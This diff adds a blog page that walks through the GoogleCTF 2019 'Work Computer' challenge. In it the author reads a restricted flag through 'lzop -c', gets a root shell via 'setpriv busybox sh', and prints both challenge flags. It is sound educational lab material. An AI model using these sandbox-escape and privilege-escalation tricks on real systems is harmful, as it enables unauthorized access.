@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || GoogleCTF Beginner&#39;s Quest 2019 - Work Computer</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">GoogleCTF Beginner&#39;s Quest 2019 - Work Computer</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="July 24, 2019">
+      Jul 24
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories"></a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/googlectf-beginners-quest-2019">GoogleCTF Beginner&#39;s Quest 2019</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/sandbox">sandbox</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h2 id="description">Description</h2>
+<blockquote>
+<p>With the confidence of conviction and decision making skills that made you a contender for Xenon&rsquo;s Universal takeover council, now disbanded, you forge ahead to the work computer.   This machine announces itself to you, surprisingly with a detailed description of all its hardware and peripherals. Your first thought is &ldquo;Why does the display stand need to announce its price? And exactly how much does 999 dollars convert to in Xenonivian Bucklets?&rdquo; You always were one for the trivialities of things.</p>
+<p>Also presented is an image of a fascinating round and bumpy creature, labeled &ldquo;Cauliflower for cWo&rdquo; - are &ldquo;Cauliflowers&rdquo; earthlings?  Your 40 hearts skip a beat - these are not the strange unrelatable bipeds you imagined earthings to be.. this looks like your neighbors back home. Such curdley lobes. Will it be at the party?</p>
+<p>SarahH, who appears to be  a programmer with several clients, has left open a terminal.  Oops.  Sorry clients!  Aliens will be poking around attempting to access your networks.. looking for Cauliflower.   That is, <em>if</em> they can learn to navigate such things.</p>
+</blockquote>
+<h2 id="solving">Solving</h2>
+<p>Okay, we can probably try <code>netcat</code> to connect to that host:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nc readme.ctfcompetition.com 1337
+</code></pre></div><p>Nice, we are in! Let&rsquo;s poke around!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; id
+uid=0 gid=0 euid=1338 groups=0
+&gt; ls -l
+total 8
+----------    1 1338     1338            33 Jul 24 15:48 ORME.flag
+-r--------    1 1338     1338            28 Jul 24 15:48 README.flag
+&gt; cat README.flag
+error: No such file or directory
+&gt; cat ORME.flag
+error: No such file or directory
+&gt; uname -a
+Linux jail-0 4.15.0-1023-gcp #24-Ubuntu SMP Wed Oct 10 13:28:59 UTC 2018 x86_64 Linux
+&gt; cd
+aliensh: expected argument to &#34;cd&#34;
+
+</code></pre></div><p>So&hellip; using <code>cat</code> fails because&hellip; the binary just doesn&rsquo;t exist on <code>aliensh</code>.</p>
+<p>No worries, let&rsquo;s try something else, a classical one, look for SUID binaries!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; find /bin -perm <span class="m">4000</span>
+error: No such file or directory
+</code></pre></div><p>Oh. No <code>cat</code>, no <code>find</code>&hellip; but what do we have then?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -l /bin
+total <span class="m">800</span>
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 arch -&gt; /bin/busybox
+-rwxr-xr-x    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>       <span class="m">796240</span> Jan <span class="m">24</span> 07:45 busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 chgrp -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 chown -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 conspy -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 date -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 df -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 dmesg -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 dnsdomainname -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 dumpkmap -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 <span class="nb">echo</span> -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 <span class="nb">false</span> -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 fdflush -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 fsync -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 getopt -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 hostname -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ionice -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 iostat -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ipcalc -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 <span class="nb">kill</span> -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 login -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ls -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 lzop -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 makemime -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mkdir -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mknod -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mktemp -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mount -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mountpoint -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 mpstat -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 netstat -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 nice -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 pidof -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ping -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ping6 -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 pipe_progress -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 printenv -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 ps -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 <span class="nb">pwd</span> -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 reformime -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 rm -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 rmdir -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 run-parts -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 setpriv -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 setserial -&gt; /bin/busybox
+-r-sr-xr-x    <span class="m">1</span> <span class="m">1338</span>     <span class="m">1338</span>         <span class="m">19936</span> Jun <span class="m">13</span> 12:48 shell
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 sleep -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 stat -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 stty -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 sync -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 tar -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 <span class="nb">true</span> -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 umount -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 uname -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 usleep -&gt; /bin/busybox
+lrwxrwxrwx    <span class="m">1</span> <span class="m">65534</span>    <span class="m">65534</span>           <span class="m">12</span> May  <span class="m">9</span> 20:49 watch -&gt; /bin/busybox
+</code></pre></div><p>Ooooh, but <code>busybox</code> has lots of cool commands, like <code>busybox cat</code> for example!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; /bin/busybox
+busybox can not be called <span class="k">for</span> alien reasons.
+</code></pre></div><p>Awww :( That would have been too easy! Damn those alien reasons!</p>
+<p>More poking around, is there something in the environment variables or in the process running on the system?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; printenv
+<span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
+<span class="nv">PWD</span><span class="o">=</span>/challenge
+&gt; ps
+PID   USER     TIME  COMMAND
+    <span class="m">1</span> <span class="m">1338</span>      0:00 /bin/shell
+    <span class="m">5</span> <span class="m">1338</span>      0:00 ps
+</code></pre></div><p>Wow, that is one sad machine&hellip; :(( Well, well, we are a bit stuck so far&hellip;</p>
+<p><img src="cat_stuck_2.webp" alt=""></p>
+<p>Okay, let&rsquo;s get back to the list of binary in <code>/bin</code> and get ready to read <a href="https://busybox.net/downloads/BusyBox.html">some Busybox documentation</a>. Maybe we will stumble upon a useful but total stranger binary. So, after trying all the obscure binaries I had never heard of, may I present to you, <a href="https://www.lzop.org/">lzop</a> (If I were you, I&rsquo;d click that link just to look at the retro logo). Anyway, <code>lzop</code> is a file compressor, similar to <code>gzip</code>. The list of options in the version bundled in busybox is the following:</p>
+<blockquote>
+<p>lzop [-cfvd123456789CF] [FILE]&hellip;</p>
+<pre><code>-c      Write to standard output
+-f      Force
+-v      Verbose
+-d      Decompress
+-F      Don't store or verify checksum
+-C      Also write checksum of compressed block
+-1..9   Compression level
+</code></pre>
+</blockquote>
+<p>Huhu, I like the sound of that <code>-c</code> option! We should try it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ lzop -c README.flag
+LZO
+
+ 0	@ÄCTF<span class="o">{</span>4ll_D474_5h4ll_B3_Fr33<span class="o">}</span>
+</code></pre></div><p>Oh-it-worked. Neat, huh?</p>
+<p>Flag: <code>CTF{4ll_D474_5h4ll_B3_Fr33}</code></p>
+<h2 id="alternative-ending">Alternative Ending</h2>
+<p>Did you notice that pesky <code>ORME.flag</code>? The previous solution doesn&rsquo;t work on it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ lzop -c ORME.flag
+lzop: can<span class="s1">&#39;t open &#39;</span>ORME.flag<span class="err">&#39;</span>: Permission denied
+</code></pre></div><p>Messing around with <code>setpriv</code>, because the man page said it was a good idea:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">setpriv - run a program with different Linux privilege settings
+(...)
+
+Sets or queries various Linux privilege settings that are inherited across execve(2).
+
+       In  comparison  to  su(1) and runuser(1), setpriv(1) neither uses PAM, nor does it prompt for a
+       password.  It is a simple, non-set-user-ID wrapper around execve(2), and can be  used  to  drop
+       privileges  in  the  same way as setuidgid(8) from daemontools, chpst(8) from runit, or similar
+       tools shipped by other service managers.
+
+-- man setpriv
+</code></pre></div><p>This allows us to bypass the limitation on <code>busybox</code> and run it, yay!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; setpriv busybox
+BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.
+[...]
+&gt; setpriv busybox id
+uid=0 gid=0 groups=0
+</code></pre></div><p>Which meaaaaans ! That we can run a root shell !</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; setpriv busybox sh
+id
+uid=0 gid=0 groups=0
+
+</code></pre></div><p>Yes! Getting the content of that <code>ORME.flag</code> is gonna be a piece of cake now:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">busybox chmod 444 ORME.flag
+busybox cat ORME.flag
+CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
+</code></pre></div><p>Flag: <code>CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}</code></p>
+<h2 id="links">Links</h2>
+<ul>
+<li><a href="https://busybox.net/downloads/BusyBox.html">https://busybox.net/downloads/BusyBox.html</a> : official documentation of busybox</li>
+<li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> : a list of vulnerable binaries, which are super useful to escape from sandbox :D</li>
+</ul>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solving">Solving</a></li>
+        <li><a href="#alternative-ending">Alternative Ending</a></li>
+        <li><a href="#links">Links</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
